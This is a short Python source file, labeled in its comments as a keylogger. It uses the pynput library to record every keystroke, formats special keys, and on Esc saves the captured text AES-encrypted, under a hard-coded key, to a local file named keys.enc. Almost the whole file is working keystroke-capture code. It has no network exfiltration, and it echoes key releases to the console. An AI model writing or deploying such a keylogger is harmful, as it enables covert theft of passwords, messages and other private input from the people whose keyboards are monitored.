from pynput import keyboard
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

class AESCipher(object):

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

aes = AESCipher(key="\xb5")
#z = aes.encrypt(raw = "he is a gud boy")

#Keylogger

keys = []

def format_special_key(key):
    if key == keyboard.Key.space:
        return " "
    if key == keyboard.Key.backspace:
        return "\b"
    elif key == keyboard.Key.enter:
        return "\n"
    elif key == keyboard.Key.shift:
        return "shift"
    # If the input is an invisible modifier key (e.g. Shift, Alt)
    # surrond it with brackets.
    return format_modifier_key(key)

def write_to_file(keys: list):
    with open('keys.enc', 'wb') as file:
        #for key in keys:
        file.write(aes.encrypt(raw = ''.join(keys)))
           
def on_press(key):
    keys.append(format_key(key))
    #write_to_file(keys)

def format_key(key):
    if isinstance(key, keyboard.Key):
        return format_special_key(key)
    # Key data types have a char attribute that represent a key's alphanumeric value.
    return str(key.char)

def strip_apostrophe(key):
    return str(key).replace("'", "")

def format_modifier_key(key):
    key = strip_apostrophe(key)
    key = key.replace("Key.", "")
    return f"[{key}]"

# Outputs each keypress event to the command line
def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        write_to_file(keys)
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#print(keys)
